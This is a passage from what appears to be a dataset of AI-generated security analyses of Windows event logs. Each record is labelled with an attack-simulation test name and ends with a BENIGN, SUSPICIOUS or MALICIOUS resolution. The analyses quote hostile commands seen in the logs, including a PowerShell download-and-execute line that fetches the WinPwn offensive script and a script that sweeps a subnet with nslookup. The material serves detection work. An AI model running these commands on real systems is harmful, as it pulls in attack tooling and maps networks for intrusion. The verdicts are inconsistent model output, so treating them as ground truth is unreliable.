4. **Consecutive and Frequent Use of `wevtutil.exe`**:
   - The execution logs for `wevtutil.exe`, a tool used to manage event logs, multiple times by the same user (`SERVER002\\admin_test`) could indicate log clearing or manipulation to hide traces of malicious activity.

### Assessment:
The behavior noted above could potentially indicate malicious activity. The use of `kerbrute.exe` associated with PowerShell, the pattern of command execution, and the fact that event logs are being accessed with tools like `wevtutil.exe` in quick succession can be correlated with indicators of compromise. These observations warrant further investigation into the context and necessity of these actions.

### Resolution:
**SUSPICIOUS**

### Guidance:
1. **Conduct a Detailed Investigation**:
   - Verify if the administrative user `admin_test` executed these commands intentionally. 
   - Check the necessity and purpose of `kerbrute.exe` on this server.
   
2. **Monitoring and Threat Hunting**:
   - Enable heightened monitoring on PowerShell activities and consider employing enhanced logging to capture command lines fully.
   - Conduct a threat hunt for similar suspicious activities across other systems within the network.

3. **Review Access and Permissions**:
   - Review the permissions and access history of the `admin_test` user.
   - Audit the usage of `wevtutil.exe` to determine any log tampering attempts.

4. **Incident Response Readiness**:
   - Prepare to initiate a full incident response procedure if additional malicious indicators or breaches are confirmed in further investigations. 

This resolution aims to address potential threats without triggering unnecessary alarm, prioritizing further investigation and surveillance to ascertain the full extent and nature of the activities."
WinPwn - bluekeep,"After analyzing the series of Windows event logs provided, I have identified several points of interest and potential indicators of suspicious or malicious activity:

1. **Time Manipulation:**
   - The Security logs indicate Event ID 4616, which refers to a ""System Time Change."" The time was set back from `2024-11-02 10:15:51.9577153` to `2024-11-02 10:15:39.1797852`. Frequent and unexpected time changes, especially by unauthorized users, can be an indicator of malicious activity, possibly attempting to obscure the logs' timeline.

2. **Privilege Escalation:**
   - Event ID 4672 records special privileges assigned to the user `admin_test`. The list includes `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege`, among others. These privileges can enable a user to have substantial control over the system, which could be misused if granted to a potentially compromised account.

3. **Process Execution:**
   - In the Sysmon logs, there is a process (PowerShell) executed with a download command from a GitHub repository `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script could potentially be harmful, especially if executed without the user's knowledge or consent.

4. **Unusual PowerShell Activity:**
   - The Windows PowerShell logs feature multiple entries indicating PowerShell execution with seemingly unrelated and possibly obfuscated commands. The commands involve scripting and downloading contents from an external source, which is often used during attacks like malware delivery or information gathering.

5. **Unusual Logon Patterns:**
   - Multiple instances of successful logon events (Event ID 4624) for the `admin_test` account using NTLM authentication might suggest lateral movement, especially when combined with the privilege escalation logs.

**Assessment:**
- The logs contain indications of potentially malicious activity, especially considering the privilege escalation, unusual process execution, and potentially harmful PowerShell commands from external sources.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Conduct a Full Investigation:**
   - Verify the legitimacy of the PowerShell scripts executed. Check whether they are part of standard operations or have been introduced maliciously.
   
2. **User Account Review:**
   - Assess activities concerning the `admin_test` account, including a review of account usage and confirmation of authorized access.

3. **Network Traffic Analysis:**
   - Analyze network traffic logs around the time of suspicious activities for any external connections or data exfiltration.

4. **Review Time Changes:**
   - Investigate the source and intent behind the observed system time changes. This could indicate log manipulation efforts.

5. **Enhanced Monitoring:**
   - Enable enhanced logging and monitoring, especially around key security events and the execution of PowerShell scripts, to detect further suspicious activities. 

Taking these steps will help identify the nature of the activity and safeguard against potential threats. Further analysis and validation are recommended to confirm or dismiss the suspicion of compromise."
Process Discovery - tasklist,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the activities observed:

### System Log Analysis:
1. **Kernel-General EventID 1 and 24**: These events are related to the system clock, specifically a time change initiated by a process (`svchost.exe`). The time was set back, indicating manual intervention or an automatic time synchronization correction. Such modifications can occasionally be linked with malicious activity if time manipulation is being done to obfuscate traces.

2. **Time Synchronization (EventID 35)**: The time synchronization pointed to `time.windows.com`, which is a legitimate NTP server. The server updated its time based on this time source.

### Sysmon Log Analysis:
1. **Process Executions (EventID: 1 and 5)**: The logs show consistent operations involving standard system binaries such as `whoami.exe`, `hostname.exe`, `cmd.exe`, `tasklist.exe`, and `wevtutil.exe`, all executed by the user `SERVER002\admin_test`. A few details stand out:
   - The use of `whoami.exe` and `hostname.exe` suggests the user was checking system and user information, which might be part of routine tasks.
   - The execution of `cmd.exe` with the tasklist action seems benign but can sometimes indicate a reconnaissance action in a malicious context if the user's role does not typically involve such activity.
   - Multiple instances of `conhost.exe` are associated with command-line processes, which is standard on Windows systems.

2. **Execution of `wevtutil.exe`**: This tool is typically used to manage Windows event logs. Multiple executions in a short time frame could be suspicious if they reflect an attempt to manipulate or clear event logs to cover tracks.

### Security Log Analysis:
1. **Security-Audit EventID 4616**: This reflects the time change similar to what’s captured in the System logs. `svchost.exe` seemed to be responsible, connecting back to the time synchronization process in the System logs.

### Application Log Analysis:
1. **Security-SPP EventID 16384**: It is related to the Software Protection Platform Service, indicating normal operation checks or updates.

### Assessment:
- **Time Change Operations**: While the time change by `svchost.exe` could initially appear suspicious, no direct indications of malicious alteration, such as a significant time rollback often associated with obfuscation, were evident.
- **Process Executions**: The processes executed (e.g., `whoami`, `tasklist`, etc.) are typical system administration actions. The context and frequency could reflect normal activity but warrant checking if this matches usual behavior for the `admin_test` user on `Server002`.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - While no outright malicious activity is detectable, the alteration of system time and repeated use of logging tools like `wevtutil.exe` suggest a need for further investigation, especially in understanding the context for these actions and corroborating with user activity patterns or intent.

### Guidance:
- Verify with the system administrator if they made any time changes or executed the observed processes intentionally.
- Review access control and audit logs for the user `admin_test`.
- Conduct a user behavior analysis to determine if these actions correspond to their regular duties.
- Consider implementing alerts for time-change events and `wevtutil.exe` executions to detect potential tampering in real-time."
Applications Installed,"Based on the provided logs, let's analyze for any indicators of potential malicious activity:

### System Log Analysis:
- **Time Synchronization Events:** There are events related to time changes on the system. The time was adjusted by a short amount of time and this was performed by `svchost.exe`. However, time change events are common and often relate to normal system operations adjusting for time drift.
- **Kernel Events:** No kernel-related events indicate suspicious activity. These logs pertain to normal Windows kernel operations.

### Windows PowerShell Log Analysis:
- **PowerShell Execution:** The logs indicate the execution of a PowerShell command to query installed software on the system. This operation, while it looks benign, can sometimes be a precursor to information gathering by an attacker if not initiated by a legitimate administrator or automated process. 
  - The command executed was: `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*...` This command is often used for inventory or audit purposes.

### Security Log Analysis:
- **Security Event (4616):** This event log indicates a change in the system's time. While it mentions svchost.exe tasked with this update, which corresponds to system services, there's no indication of unauthorized access or escalation.

### Sysmon Log Analysis:
- **Process Creation Events:** There are logs showing the creation and execution of common Windows processes like `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, `svchost.exe`, and `PowerShell.exe`. These processes originate from expected directories and use legitimate commands.
- **Command-line Parameters:** The command lines for these processes don't include suspicious or known bad arguments.
- **User Account Context:** The operations are performed under an account named `admin_test` or `NT AUTHORITY\SYSTEM`. The `admin_test` user is identified, but without background on whether this is a valid user, this usage is unremarkable by itself without additional context.

### Assessment:
- **No Direct Malicious Indicators:** Upon review of the logs, there are no direct indicators of malicious activity such as unauthorized process executions, privilege escalation attempts, or known malicious command-line arguments.
- **PowerShell Activity:** The PowerShell script could be investigated further to ensure it's being executed for legitimate purposes, especially if the `Server002\admin_test` user is not typically active or authorized to conduct software audits.

### Conclusion:
Given the information at hand, the activity appears to be routine and aligns with normal system and network operations. The only potential concern is the context surrounding the PowerShell usage, but without additional evidence, it doesn't constitute a clear risk.

**Final Resolution: BENIGN**

### Guidance:
- **Verify PowerShell Usage:** You may want to verify if the PowerShell execution was intended and by the appropriate user. However, this seems more like a housekeeping task rather than an indicator of compromise.
- **Continuous Monitoring:** Continue monitoring for any new events that may corroborate or contradict the current findings."
Enumerate Active Directory Computers with Get-AdComputer,"Upon analyzing the provided log entries, here are the key observations:

1. **Windows Defender Status**:
   - The Application log shows Windows Defender is on, indicating that anti-malware components are functioning.

2. **Windows Update Activity**:
   - System log entries indicate that updates for Microsoft Defender Antivirus are being downloaded and installed. This is normal behavior for system maintenance.

3. **Sysmon Analysis**:
   - There are several events related to command-line utilities like `hostname.exe`, `whoami.exe`, and PowerShell script execution. While usage of command-line utilities and PowerShell can sometimes indicate suspicious activity, the executed commands (`Get-AdComputer -Filter *`, `whoami.exe`, etc.) appear typical for legitimate administrative or maintenance operations.
   - Processes like `wevtutil.exe` and `conhost.exe` are legitimate Windows processes often associated with logging and console workflows.
   - Activity involving legitimate Microsoft services and software, including updates and system maintenance, is recorded without any evident modification or anomaly in the command lines.

4. **Security Log**:
   - There are several attempts to authenticate with a `MicrosoftAccount` which returned a code suggesting some form of unsuccessful access or connection. This might require further context, but on its own, it does not definitively indicate a compromise or malicious intent. This could be a normal operation attempting to access resources that are temporarily unavailable.

5. **PowerShell Activity**:
   - The PowerShell logs show the `Get-AdComputer -Filter *` command being executed. This command retrieves a list of all AD computer objects. While it accesses AD data, it isn't inherently malicious and often used for inventory or audit purposes.

### Assessment:
- **Overall**, the activities recorded in these logs predominantly relate to system updates, routine system maintenance, and typical administrative operations.
- The unsuccessful authentication attempts in the Security Log do not immediately suggest malicious intent without additional context, such as repeated patterns or associated anomalous activities.
- None of the command-line activities, process creations, or updates exhibit signs of obfuscation or suspicious command-line arguments that would indicate a malicious operation.

### Conclusion:
- **Resolution: BENIGN**: The log entries provided depict expected and benign system behaviors typical within an active Windows environment. However, continued monitoring for context and potential patterns over time is advisable, especially if new similar events arise.

### Guidance:
- Maintain regular monitoring of logs for any newly emerging patterns or behaviors.
- Consider context for failed connection/authentication attempts in the Security log—verify if users report access issues or resource availability changes.
- Ensure all systems remain updated, and security appliances continue regular scans and updates."
Network Share Discovery command prompt,"Upon reviewing the provided logs, here is a detailed analysis focusing on identifying suspicious or anomalous behaviors and assessing potential threats:

### Analysis:

1. **Sysmon Logs:**
   - Multiple instances of processes such as `wevtutil.exe` and `conhost.exe` running under the user `SERVER002\\admin_test` could raise a flag. However, these processes are legitimate Windows system utilities.
   - Frequent execution of `wevtutil.exe` could imply log querying or manipulation. However, without other corroborating evidence, such singular events do not definitively indicate malicious activity.
   - Usage of CMD and `net.exe` with commands like `""cmd.exe"" /c net view \\\\localhost` by `admin_test`. These actions could be seen as administrative tasks; however, in a high-integrity context, they might represent reconnaissance activity.

2. **Security Logs:**
   - Event ID 4624 (logon) is using NTLM authentication with IP `192.168.0.102`, accessed via a network logon type (Logon Type 3). This may be typical for administrative tasks, but confirmation that this IP is a known trusted source is advisable.
   - High privilege rights assigned (SeSecurityPrivilege, SeBackupPrivilege, etc.) to the user `admin_test`, which may be standard for an admin account but should be verified as appropriate.
   - Event ID 4672 indicates a privilege escalation, but since these belong to a legitimate admin account, the escalation appears non-malicious if the account activity is expected.

3. **Application Logs:**
   - Microsoft Edge Update service-related activities (`edgeupdate.exe`). Given the time intervals and actions, these seem to be regular service operations around updating the application.

4. **System Logs:**
   - Time synchronization via `time.windows.com` is normal for maintaining accurate system clock settings and isn't unusual.

### Assessment:

- **BENIGN vs. SUSPICIOUS vs. MALICIOUS:**
  - Most activities observed seem to be part of regular administrative tasks executed by a legitimate user, primarily involving Microsoft system and application updates (e.g., Microsoft Edge updates).
  - While there are instances of `cmd.exe` and `net.exe` executions that could be reconnaissance attempts, these are executed under a legitimate user context without any further evidence of compromise or unauthorized access.
  - The network logon tied to NTLM authentication from a specific IP should be validated to ensure that this source is trusted and commonly interacts with the server.

### Final Evaluation and Guidance:

**Resolution: SUSPICIOUS**

- **Steps to proceed:**
  - Verify the source of the logon IP (192.168.0.102) and confirmation whether it is indeed a trusted workstation.
  - Ensure that the account `admin_test` is expected to perform such administrative activities and holds the necessary permissions.
  - Consider conducting a review of user account activity over a broader timeline to rule out any anomalous behaviors.
  - If outcomes from above checks are favorable, the logs could indeed be classified as BENIGN.

- If any anomalies or access attempts from unknown sources are observed, it would necessitate immediate attention and possibly move towards a MALICIOUS classification."
System Information Discovery (2),"Upon thoroughly reviewing the provided log entries, several areas of potentially suspicious activity can be highlighted:

1. **Processes Executed**:
   - The logs show frequent command-line executions involving legitimate Windows executables like `cmd.exe`, `wevtutil.exe`, `whoami.exe`, `conhost.exe`, `net.exe`, `netsh.exe`, and `sc.exe` by the user `SERVER002\admin_test`.
   - There is a process execution of `cmd.exe` with the command line `""cmd.exe"" /c wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs`. This suggests the execution of a VBScript file named `gatherNetworkInfo.vbs`, typically a method used in information gathering scripts and is suspicious in a secure environment unless explicitly approved.
   - Additionally, there are numerous executions of `wevtutil.exe`, which is often used to export Windows event logs, indicative of log tampering or reconnaissance activities.
   - The PowerShell activity recorded involves network-related and system information gathering commands, which are often used in post-exploitation scenarios.

2. **User and Privilege Details**:
   - The user executing most commands is `admin_test` with high integrity level, which indicates administrative privileges. Privilege escalation attempts could be a risk if this activity was unexpected or unauthorized.
   - The frequent invocation of commands to display or export system configurations, network connections, and services, especially using elevated privileges, could imply either legitimate administrative tasks or suspicious activity, depending on context.

3. **Time Anomalies**:
   - There is a kernel general (Event ID: 1) indicating a system time change. This could indicate attempts at hiding activity or creating log forgery. The time change is small, but if not expected, it may signify unauthorized adjustments.

4. **Security Events**:
   - Security log entries (Event ID: 4624 and 4672) indicate successful logons with elevated privileges. These could be normal system operations or need examination if they're out of context for usual administrative activities.
   - There are cryptographic operations recorded (Event IDs: 5058, 5061), which could be part of normal operations, or may indicate efforts to sign or verify data within the system context.

**Assessment and Resolution**:
Given the combination of frequent administrative-level command executions, network and system configuration queries, possible VBScript execution, time changes, and overall patterns observed, these activities cannot be outright classified as benign without further context around the intents and approvals for these actions. Although tools and commands in use are legitimate, the volume and nature of activity could point to reconnaissance or preparation for later stages of compromise, potentially by an insider or due to compromised credentials.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Verify Intent**: Check with `admin_test` or relevant authorities regarding the purpose of these activities.
2. **Validate Access Controls**: Ensure that only authorized personnel have access to execute such commands.
3. **Analyze Scripts**: Examine any scripts involved, especially `gatherNetworkInfo.vbs` for unauthorized or malicious activity.
4. **Review System Changes**: Investigate the legitimacy and intent behind the time adjustments logged.
5. **Monitor and Audit**: Increase monitoring on this and related user accounts for similar future activities and audit recent changes for anomalies.
6. **Ensure Alignment with Policies**: Validate all actions align with organizational policies and consider updating security policies to address identified gaps."
WinPwn - Dotnetsearch,"Upon thorough examination of the provided logs, key events that stand out indicating possible malicious activity include the Windows PowerShell and Sysmon logs:

1. **Windows PowerShell Log:**
   - Several PowerShell events recorded (EventID 600) show the execution of a script from a URL, particularly using the command string:
     ```
     $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     Dotnetsearch -noninteractive -consoleoutput
     ```
   - This behavior is typically associated with the execution of potentially harmful scripts from an untrusted source, which could be a penetration testing script or malware.

2. **Sysmon Log:**
   - Event ID 1 entries highlight the execution of `powershell.exe` with the same suspicious command line as observed in PowerShell logs. 
   - Additional processes like `whoami.exe` and `hostname.exe` are being executed, which, while not inherently malicious, can be a part of reconnaissance activities when used collectively in certain operations.

3. **Time Changes:**
   - Several entries (EventID 4616 and EventID 1) in the Security and System logs indicate small time adjustments. While this might often be benign or an indication of system time synchronization, in conjunction with other findings, it could also suggest attempts at obscuring operational timelines.

**Assessment:**
- The execution of PowerShell scripts directly from URLs is usually considered suspicious unless verified as part of legitimate administrative operations.
- The combination of script execution with network activity and tool usage (i.e., `whoami`, `hostname`) suggests potential reconnaissance or staging for further actions.

**Resolution:**
- **MALICIOUS**: The logs show clear signs of potentially harmful activities through unauthorized script execution from an external URL and subsequent command executions possibly indicating malicious intent.
  
**Recommendations:**
1. **Immediate Containment**: Disconnect the affected system from the network to prevent further propagation or data exfiltration.
2. **Incident Response**: Conduct a deeper forensic investigation to determine the scope of the compromise. Capture memory dumps and images of affected systems.
3. **Review of PowerShell Activity**: Monitor PowerShell logs across the network for similar script execution activities.
4. **User Education and Policy Enforcement**: Reinforce security policies and educate users about executing scripts from untrusted sources.
5. **Network Traffic Analysis**: Examine network logs for any unusual outbound connections correlating with the execution times of the PowerShell scripts."
Display group policy information via gpresult,"In examining the provided Windows event logs, the following key observations were made:

1. **Time Change Events**: In the security and system logs, there are events indicating time adjustments. The system time was set back slightly (Event ID 4616 in the security log; Event ID 1 in the system log). While this could be a legitimate synchronization with a time server (evidenced by Event ID 35 from the Time Service), unauthorized changes to system time can be used by attackers to cover tracks or to bypass scheduled security checks. The process involved is `svchost.exe`, which is typically legitimate, but its credibility depends on the context.

2. **Use of Command-line Utilities**: 
   - `whoami.exe` and `gpresult.exe` were executed. These are standard Windows command-line tools used for gathering user information and group policy results, which could be legitimate if run by a system administrator. They were executed by the user `admin_test` with high integrity levels, which is typical of administrative activities.
   - `cmd.exe` was also seen executing `gpresult /z`. This context could indicate routine administrative troubleshooting or configuration verification.

3. **Edge Update Activity**:
   - There are multiple events related to Microsoft Edge Update activities, where processes like `MicrosoftEdgeUpdate.exe` were executed multiple times. The parent processes point toward legitimate Edge update and installation procedures. This includes activities involving processes like `MicrosoftEdgeUpdateComRegisterShell64.exe` and `setup.exe`, activities that are within the expected range for a legitimate application update session.

4. **Service Stoppages**:
   - Notifications were found about the stopping of `edgeupdate` services, which could be routine given software updating processes. However, any abrupt or unexplained service stoppages are worth noting, though in this case, they appear related to Edge updates.

5. **Process Integrity and User Context**:
   - Nearly all activities, including those involving Elevated permissions, appear under legitimate user or system accounts like `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`, suggesting legitimacy unless otherwise suspicious.

**Assessment and Conclusion**:
- **BENIGN**: Based on the analysis, the activities logged appear consistent with normal administrative duties and legitimate software update procedures. The time changes, use of diagnostic command-line tools, and Microsoft Edge update activities do not immediately indicate unauthorized or malicious behavior.
- **GUIDANCE**: Continue monitoring for any changes in behavior patterns or for any new anomalies. Regularly verify the integrity and trustworthiness of executables and scripts executed, especially from privileged accounts or services.

In conclusion, while there are natural flags to review, they currently align with acceptable routine actions or could be adequately explained through normal operational activities."
Query Registry,"Upon reviewing the provided logs, the following observations can be made with respect to any indicators of potentially suspicious or malicious activity:

**Analysis of Logs:**

1. **Process Execution and Registry Access:**
    - Multiple instances of `reg.exe` accessing various registry keys related to system startup and configuration were observed. This type of behavior is often associated with system reconnaissance or attempts to manipulate startup configurations for persistence:
      - **CommandLine:** Extensive registry querying, particularly under paths such as `RunServicesOnce`, `RunServices`, `Winlogon`, `RunOnce`, and `ShellServiceObjectDelayLoad`. While these could certainly be part of administrative tasks, given the volume and targets of these queries, this could indicate an attempt to discover auto-start extensibility points or potential persistence mechanisms. 
      
2. **Wevtutil and Conhost Processes:**
    - Instances of `wevtutil.exe` and `conhost.exe` were consistently appearing, specifically under the user account `SERVER002\\admin_test`. `wevtutil` is used to manage event logs, and frequent invocation—especially if not part of routine tasks—can be suspect for tampering logs or gathering event data.
    
3. **Command-Line Patterns:**
    - The pattern of using command-line utilities (`cmd.exe` followed by `reg.exe`, `findstr.exe`) suggests a possible scripted or semi-automated process. While this could be benign, in an environment where these commands aren't regularly automated, it could also point to an attempt at system auditing or data exfiltration preparation.
    
4. **Privilege Levels and Timing:**
    - Activities were conducted at a high integrity level, which is typical for an admin session, but also necessary for executing malicious administrative tasks.

5. **Software Updates:**
    - The logs show activities related to the update of Microsoft Edge and the Security Intelligence Update for Microsoft Defender. While these are usually benign, they indicate ongoing changes and actions on the system that should be checked to confirm they were legitimate updates scheduled by IT.

6. **Credential Access and System Interactions:**
    - Event IDs 5379 in the security logs with `ReturnCode` 3221226021 indicate unsuccessful attempts related to credential fetching which could either be benign access errors or indicative of unauthorized attempts.

**Assessment:**
- **Resolution:** SUSPICIOUS
- The presence of numerous registry queries, consistent wevtutil calls, and command-line executions at a high integrity level indicate activities that necessitate further scrutiny to rule out malicious intent. These specific patterns can align with common tactics used by malware or unauthorized users for system inspection and security evasion techniques.
  
**Guidance on Further Actions:**
- **Investigate User Activity:** Analyze user `admin_test` activity to ensure that all actions can be accounted for and are legitimate, especially those involving registry queries and `wevtutil`.
- **Review Scheduled Tasks and Automation:** Ensure the observed activities align with legitimate scheduled maintenance tasks or administrative automation.
- **Verify Software Updates:** Confirm recent software updates (e.g., Edge, Defender) are legitimate and originated from trustworthy sources.
- **Network Activity Analysis:** Check for any unusual network activities or connections that might suggest outbound data transfer or communications with external analysis servers.
- **Internal System Audit:** Conduct an audit of critical system configurations to detect any unauthorized changes or additions.

Considering these activities and your organization's security posture, further in-depth analysis is warranted to eliminate any potential security threat."
Environment variables discovery on windows,"### Detailed Analysis of the Logs

**1. **Suspicious Timestamps:**
   - **Kernel-General and Security-Auditing Logs:** There are events related to time changes (EventID: 1 and EventID: 4616) that indicate the system time being modified backward. 
   - **Details:** The old time is consistently set ahead of the new time, which can sometimes be an attempt to bypass timestamp-based detection mechanisms.

**2. **Privilege Escalation:**
   - **EventID 4672 (Special Privileges assigned to New Logon):** The user `admin_test` is granted several high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). Although this could be legitimate if done by an administrator, the context warrants scrutiny especially if `admin_test` is not a regular administrative account.
   - **EventID 4624 and 4634 (Logon and Logoff):** The logs contain multiple logon and logoff events for `admin_test`, indicating an active session possibly performing administrative tasks.

**3. **System Utility Execution Patterns:**
   - **Sysmon Logs (EventID 1, 5):** Consistent usage of `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and `hostname.exe` by the `admin_test` user are visible. These can be indicative of reconnaissance or an attempt to gather system information.
   - **Anomalous Execution Context:** Such utilities being executed in quick succession could suggest scripted activity or automated reconnaissance.

**4. **Use of Remote Infrastructure:**
   - **Security Events (IP Information):** The logon records from `DESKTOP-3HL5B2P` using NTLM authentication suggest a connection from a remote machine.
   - **Client IP Address:** The IPv6 address `fe80::e3b5:5371:12a8:9c77` indicates a local-link connection, which needs to be verified for its legitimacy.

**Assessment and Threat Evaluation:**
- The logs contain activities indicative of possible reconnaissance or system probing activities (e.g., use of system utilities like `whoami.exe`, `hostname.exe`, `wmic`, etc.).
- There are signs of potentially unauthorized time manipulation and high-level privilege usage, which can be tied to adversarial tactics.
- Continuous logging and privilege use by `admin_test` warrant confirmation of purpose and legitimacy.
  
**Guidance and Action Plan:**
1. **User Verification:** Confirm the activities performed by the `admin_test` account and verify if these actions were legitimate administrative tasks.
2. **Review Time Adjustments:** Investigate time changes to verify whether it was a scheduled task, legitimate correction, or potential tampering.
3. **Network Forensics:** Validate the source of the remote logon by checking IP address ownership and correlation with legitimate remote connections.
4. **Deep Dive on Time Change:** Analyze why time was being changed and potentially correlate with other activities or alerts.
5. **Threat Intelligence:** Correlate these activities with known TTPs (Tactics, Techniques, and Procedures) using Threat Intelligence to form a basis for if this matches known adversary behaviors.

### Resolution
- Based on the findings, the activity is marked as **SUSPICIOUS** due to anomalous timestamps, high-privilege assignments without clear legitimate context, and certain utility executions that might indicate reconnaissance or preparatory activities. Further investigation is recommended to rule out malicious intent."
Enumerate Root Domain linked policies Discovery,"The logs provided incorporate entries from the Windows Security, PowerShell, Application, Sysmon, and System logs. The main objective is to scrutinize these logs for suspicious or malicious activity. Here's a breakdown of my findings:

### Findings

1. **Security Log**
   - Event ID 4616 indicates the system time was changed. The time changes recorded appear to be minor, possibly related to synchronization with time servers, and are not necessarily suspicious on their own. They occur through a legitimate process (`svchost.exe`), which is typically associated with such actions.

2. **PowerShell Log**
   - PowerShell activity shows the execution of commands that appear to be related to querying Group Policy links via ADSI. The command logged is potentially concerning as it can be used for reconnaissance that an attacker might perform to assess domain policies.
   - The logged command utilizes `Write-Host` to output domain and policy paths, possibly indicative of an attempt to enumerate Group Policy Objects (GPOs). There's no clear indication of malicious intent, but the use of ADSI for enumeration warrants further investigation to rule out malicious reconnaissance.

3. **Application Log**
   - The logs contain Microsoft Edge Update service events. These are expected during update sessions and don’t exhibit signs of suspicious activity.

4. **Sysmon Log**
   - The execution timestamp ""21:33:04.5092761"" aligns with the instantiation of processes like `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. Both `wevtutil.exe` and `conhost.exe` executions can be typical but may also indicate efforts to query or manipulate event logs.
   - `Powershell.exe` is executed with potential ADSI queries, supporting the PowerShell activity from its logs. The parent process `wsmprovhost.exe` (-Embedding) is legitimate and indicates it likely started from a management session over WinRM.
   - The usage of utilities such as `HOSTNAME.EXE`, `whoami.exe`, and `wevtutil.exe` is characteristic of initial reconnaissance activities. The context of these executions should be reviewed to determine if it aligns with expected administrator behavior or requires further examination.
   - The logs show constant activity for Edge updates, which doesn't raise concerns.

5. **System Log**
   - Time synchronization events via `svchost.exe` are logged, corresponding with the time change recorded in the Security log. The utilization of `time.windows.com` as a time source is routine for time synchronization.

### Assessment:

- **Security and Sysmon logs** show legitimate process executions. However, the use of PowerShell and utilities such as `wevtutil.exe` could be exploited. Evidence does not conclusively establish malicious activity but suggests a need for further insight into why these tools were used.
  
- **PowerShell commands** targeting ADSI can be harmless during regular administrative operations but should be reviewed to confirm they originate from trustworthy sources and for legitimate reasons.

### Resolution

- **Resolution:** **SUSPICIOUS**

  The logs contain suspicious activity, particularly in PowerShell execution and the use of utilities common in reconnaissance and potential log tampering operations. Further investigation is recommended to ascertain the intention behind these actions. This should include reviewing user activity logs, potentially correlating with known user actions, and confirming whether these actions align with standard administrative practices. If abnormal behavior is confirmed, it could potentially elevate to malicious, indicating unauthorized access or intent."
Enumerate Linked Policies In ADSISearcher Discovery,"Upon reviewing the provided Windows event logs, here's a detailed analysis of potential indicators of malicious activity:

1. **Time Manipulation (Security log entries 4616 and System log entries 1 and 24):**
   - There are two Event ID 4616 logs indicating the system time was changed. Changing the system time is often used by malicious actors to bypass time-based security mechanisms or to hide activities in logs.
   - The ""NewTime"" and ""OldTime"" discrepancies suggest time backdating, which is unusual for a legitimate operation unless authorized maintenance is happening.

2. **Suspect PowerShell Activity (Sysmon Event ID 1 and PowerShell logs):**
   - The Sysmon logs indicate PowerShell was executed with an unusual command involving ""([adsisearcher]'(objectcategory=organizationalunit)').FindAll()"". This suggests an attempt to enumerate Active Directory Organizational Units and Group Policy Links, which could imply reconnaissance activity.
   - PowerShell is a powerful tool often used in legitimate scenarios, but such advanced querying could be part of attack TTPs (Tactics, Techniques, and Procedures), indicating potential lateral movement or information gathering.

3. **Frequent Process Executions (Sysmon Event ID 5):**
   - Numerous instances of `wevtutil.exe` and `conhost.exe` were created in rapid succession by the user ""SERVER002\\admin_test"". While `wevtutil.exe` can be used for normal system log management, excessive usage or likely unscheduled activity could indicate log evasion attempts.

4. **EdgeUpdate Activity (Sysmon Event ID 1):**
   - Logs show frequent execution of Microsoft Edge Update processes. While this could indicate a legitimate update process, if unscheduled, it may mask other activities or be utilized by an attacker for persistence or to run payloads.

**Assessment:**
Based on the logs, there are notable actions such as time manipulation, unusual PowerShell activity indicative of potential reconnaissance, and excessive execution of normally benign processes under a user's account, which do not typically align with standard user behavior. These events together raise suspicion.

**Recommendation:**
1. **Further Investigation:**
   - Validate if the time change and PowerShell activity are justified by any ongoing maintenance or legitimate administrative tasks.
   - Conduct a detailed review of the user's activities, specifically `admin_test`, to verify if the process executions match legitimate tasks.
   - Review server configuration and monitoring logs for unauthorized access or changes.

2. **Security Measures:**
   - Strengthen monitoring and alerting for PowerShell commands running unauthorized scripts or querying Active Directory.
   - Implement logging to better capture and flag system time changes.
   - Secure and audit administrative access, especially for accounts with elevated privileges.

**Resolution:**
- **SUSPICIOUS**: The activities are unusual and potentially indicative of malicious behavior, warranting more detailed investigation to ascertain if they are authorized and benign or if they suggest a compromise."
Remote System Discovery - nslookup,"**Analysis Summary:**

The provided logs seem to reveal a pattern of potentially suspicious behavior on the server ""Server002"" that particularly revolves around a PowerShell script execution, followed by a sequence of `cmd.exe` and `nslookup.exe` processes. Here are the key elements identified:

1. **PowerShell Script Execution:**
   - A PowerShell process executed a script at ""2024-10-21 09:34:41"" on ""SERVER002"" from the user ""admin_test"".
   - The script appears to be attempting to enumerate and resolve network hosts using IP addresses within a local subnet.
   - The command executed: `powershell.exe & {$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; ... ; foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}}`

2. **Network Scanning Behavior:**
   - The PowerShell script enumerates the IP addresses in a range and attempts to resolve their hostnames using `nslookup.exe`.
   - This sequence suggests scanning for live hosts within the subnet, a behavior often associated with reconnaissance activity by malicious actors.

3. **Sysmon and Security Logs:**
   - Several corresponding entries in Sysmon logs reflecting numerous `cmd.exe` and `nslookup.exe` processes generated by PowerShell.
   - Each `nslookup` command pertains to a unique IP address within the range, confirming logic meant for network enumeration.
   - Security logs show that the execution originated from a user with significant privileges (`admin_test`) with no corresponding suspicious logins indicating account compromise, pointing towards internal execution, possibly by an insider threat or a misconfigured privileged task.

4. **Update Installations:**
   - There are entries for Windows Update operations and updates to Microsoft products like Microsoft Edge and Defender Antivirus. These appear to be benign and part of routine system updates.

**Assessment:**

Given the evidence, the observed behavior is consistent with network reconnaissance, which is a common preliminary step in a cyber attack, typically to gather additional information about the network landscape. This kind of activity is generally initiated with malicious intent, as it involves mapping out the network infrastructure, potentially to identify vulnerabilities or entry points for further exploitation.

**Threat/Risk:**

